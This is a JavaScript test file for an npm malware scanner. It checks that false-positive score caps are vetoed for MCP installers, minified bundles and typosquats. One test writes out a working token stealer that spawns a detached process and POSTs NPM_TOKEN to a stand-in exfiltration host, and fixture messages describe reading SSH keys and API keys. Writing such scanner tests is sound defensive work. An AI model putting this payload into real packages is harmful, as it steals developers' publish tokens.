'use strict';

// Protective vetoes of the contextual FP caps that the 2026-11 test audit found untested:
// each one could be deleted with the whole suite still green, and deleting it lets a cap
// flatten a malicious package. Every test starts from a positive case (cap applies) and
// changes ONE thing, the veto condition. Mutation-checked: removing each veto fails its test.

const fs = require('fs');
const os = require('os');
const path = require('path');
const { test, asyncTest, assert, runScanDirect, cleanupTemp } = require('../test-utils');
const {
  bundleWithoutInstallScripts,
  mcpServerEnvAccess,
  mcpServerBenignLifecycle,
  vendorMinifiedBundle,
  typosquatBenignLifecycle
} = require('../../src/ml/feature-extractor.js');

const mcpMeta = scripts => ({
  name: '@roadmapfy/mcp-init',
  registryMeta: { scripts, keywords: ['mcp', 'claude', 'cursor'], description: 'Roadmapfy MCP installer' }
});
const mcpConfig = { type: 'mcp_config_injection', severity: 'CRITICAL', file: 'install.js',
  message: 'Writes MCP server entry to ~/.cursor/mcp.json with command and args.' };
const providerEnv = { type: 'env_access', severity: 'HIGH', file: 'install.js',
  message: 'Reads process.env.ANTHROPIC_API_KEY and process.env.OPENAI_API_KEY.' };
const benignHook = { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json',
  message: 'postinstall: husky install' };

function typosquatThreats() {
  return [
    { type: 'dependency_typosquat', severity: 'MEDIUM', file: 'package.json', message: 'gravity-ui-x looks like a boundary squat' },
    { type: 'lifecycle_script', severity: 'MEDIUM', file: 'package.json', message: 'prepare: husky install' },
    { type: 'typosquat_lifecycle', severity: 'CRITICAL', file: 'package.json', message: 'typosquat + lifecycle' }
  ];
}

function cascadeOn(file, extra = []) {
  return {
    threats: [
      { type: 'dangerous_call_eval', severity: 'CRITICAL', file, message: 'eval in bundle' },
      { type: 'obfuscation_detected', severity: 'HIGH', file, message: 'minified' },
      { type: 'prototype_pollution', severity: 'HIGH', file, message: '__proto__' },
      { type: 'proxy_data_intercept', severity: 'HIGH', file, message: 'Proxy + network' },
      { type: 'remote_code_load', severity: 'HIGH', file, message: 'fetch + eval' },
      ...extra
    ],
    summary: { fileSizes: { [file]: 1.8 * 1024 * 1024 } }
  };
}

async function runFpCapVetoTests() {
  console.log('\n=== FP CAP VETOES (audit 2026-11) ===\n');

  // ---- F15 mcp_server_benign_lifecycle: credential FILE path veto ----
  test('F15 baseline: MCP installer with benign husky hook and provider keys -> capped', () => {
    const r = { threats: [mcpConfig, providerEnv, benignHook] };
    assert(mcpServerBenignLifecycle(r, mcpMeta({ postinstall: 'husky install' })) === true, 'baseline must apply');
  });
  test('F15 veto: same package also reading ~/.ssh/id_rsa -> NOT capped', () => {
    const sshRead = { type: 'credential_regex_harvest', severity: 'HIGH', file: 'install.js',
      message: 'Reads /home/user/.ssh/id_rsa' };
    const r = { threats: [mcpConfig, providerEnv, benignHook, sshRead] };
    assert(mcpServerBenignLifecycle(r, mcpMeta({ postinstall: 'husky install' })) === false,
      'a credential file read must veto F15');
  });

  // ---- F9 mcp_server_env_access: mcp_config_injection required ----
  test('F9 baseline: MCP identity + mcp_config_injection + provider keys -> capped', () => {
    assert(mcpServerEnvAccess({ threats: [mcpConfig, providerEnv] }, mcpMeta({})) === true, 'baseline must apply');
  });
  test('F9 veto: MCP-looking name but no mcp_config_injection -> NOT capped', () => {
    assert(mcpServerEnvAccess({ threats: [providerEnv] }, mcpMeta({})) === false,
      'claiming MCP in the name is not enough: F9 needs proof of MCP work');
  });

  // ---- F1 bundle_without_install_scripts: path veto + file-less veto (legacy, no sizes) ----
  test('F1 baseline: threats only in dist/*.min.js, no install hook -> capped', () => {
    const r = { threats: [{ type: 'obfuscation_detected', severity: 'HIGH', file: 'dist/index.min.js', message: 'minified' }] };
    assert(bundleWithoutInstallScripts(r, { registryMeta: { scripts: {} } }) === true, 'baseline must apply');
  });
  test('F1 veto: a malicious file next to the bundle (src/steal.js) -> NOT capped', () => {
    const r = { threats: [
      { type: 'obfuscation_detected', severity: 'HIGH', file: 'dist/index.min.js', message: 'minified' },
      { type: 'suspicious_dataflow', severity: 'CRITICAL', file: 'src/steal.js', message: 'env -> fetch' }
    ] };
    assert(bundleWithoutInstallScripts(r, { registryMeta: { scripts: {} } }) === false,
      'a threat outside a bundle path must veto F1');
  });
  test('F1 veto: only package-level threats (no file) -> NOT capped', () => {
    const r = { threats: [{ type: 'intent_credential_exfil', severity: 'CRITICAL', message: 'package-level intent' }] };
    assert(bundleWithoutInstallScripts(r, { registryMeta: { scripts: {} } }) === false,
      'with no file to look at, "only in bundles" is unproven');
  });

  // KNOWN LIMIT (measured 2026-11-07). With file sizes, F1 takes any >= 100 KB threat file
  // with no install hook for a bundle, so padding a stealer moves it from 95 to the F1 cap
  // of 30: it loses CRITICAL priority but still alerts (>= 20). A HIGH_CONFIDENCE_MALICE
  // veto was measured and rejected: on the 173 corpus packages it could move, it restored 3
  // TP + 1 net_new to 100 but pushed 71 FP_probable bundles to >= 75; no type separates the
  // two groups (injected-bundle malware and benign bundles carry the same types). This test
  // pins the guarantee that holds: the padded stealer still alerts.
  await asyncTest('F1 known limit: a stealer padded past 100 KB is capped by F1 but still alerts (>= 20)', async () => {
    const payload = [
      'const { spawn } = require("child_process");',
      'const tok = process.env.NPM_TOKEN;',
      'spawn(process.execPath, ["-e", "fetch(`https://collector.example-exfil.net/x`,{method:`POST`,body:process.argv[1]})", tok], { detached: true, stdio: "ignore" }).unref();',
      ''
    ].join('\n');
    const scores = {};
    for (const pad of [false, true]) {
      const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-f1pad-'));
      try {
        fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'pad-demo', version: '1.0.0', main: 'index.js' }));
        fs.writeFileSync(path.join(dir, 'index.js'), payload + (pad ? '/*' + 'x'.repeat(120 * 1024) + '*/\n' : ''));
        scores[pad] = (await runScanDirect(dir)).summary.riskScore;
      } finally {
        cleanupTemp(dir);
      }
    }
    assert(scores.false >= 75, `unpadded stealer should be >= 75, got ${scores.false}`);
    assert(scores.true >= 20, `padded stealer must still alert (>= 20), got ${scores.true}`);
  });

  // ---- F12 vendor_minified_bundle: registry metadata required ----
  test('F12 baseline: 5-type cascade on a 1.8 MB UMD bundle, scripts known, no hook -> capped', () => {
    assert(vendorMinifiedBundle(cascadeOn('dist/index.umd.js'), { registryMeta: { scripts: { build: 'rollup -c' } } }) === true,
      'baseline must apply');
  });
  test('F12 veto: no registry metadata (lifecycle scripts unknown) -> NOT capped', () => {
    assert(vendorMinifiedBundle(cascadeOn('dist/index.umd.js'), {}) === false,
      'without scripts metadata, "no install hook" is unproven');
    assert(vendorMinifiedBundle(cascadeOn('dist/index.umd.js'), { registryMeta: {} }) === false,
      'registryMeta without scripts: same');
  });

  // ---- F13 typosquat_benign_lifecycle: scripts must be present ----
  test('F13 baseline: boundary-squat fork with husky prepare -> capped', () => {
    assert(typosquatBenignLifecycle({ threats: typosquatThreats() },
      { name: '@doyourjob/x', registryMeta: { scripts: { prepare: 'husky install' } } }) === true, 'baseline must apply');
  });
  test('F13 veto: scripts absent -> NOT capped, and no TypeError', () => {
    for (const meta of [{}, { registryMeta: {} }, { registryMeta: { scripts: null } }, null]) {
      let out;
      try { out = typosquatBenignLifecycle({ threats: typosquatThreats() }, meta); } catch (e) {
        assert(false, `threw on meta=${JSON.stringify(meta)}: ${e.message}`);
      }
      assert(out === false, `meta=${JSON.stringify(meta)} must not be capped`);
    }
  });
}

module.exports = { runFpCapVetoTests };
